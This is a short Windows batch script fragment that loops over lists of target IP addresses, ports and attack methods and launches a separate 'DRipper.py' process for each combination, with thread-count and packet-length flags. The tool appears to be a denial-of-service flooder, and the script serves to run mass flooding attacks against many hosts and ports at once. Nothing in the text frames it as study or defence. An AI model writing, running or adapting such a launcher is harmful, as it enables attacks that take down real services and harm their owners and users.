FOR %%i IN (%IP%) DO (
FOR %%p IN (%PORT%) DO (
FOR %%m IN (%METHOD%) DO (
start "%%i | %%p" python -u DRipper.py -s %%i -p %%p -t %THEAD% -m %%m -l 2048
)
)
)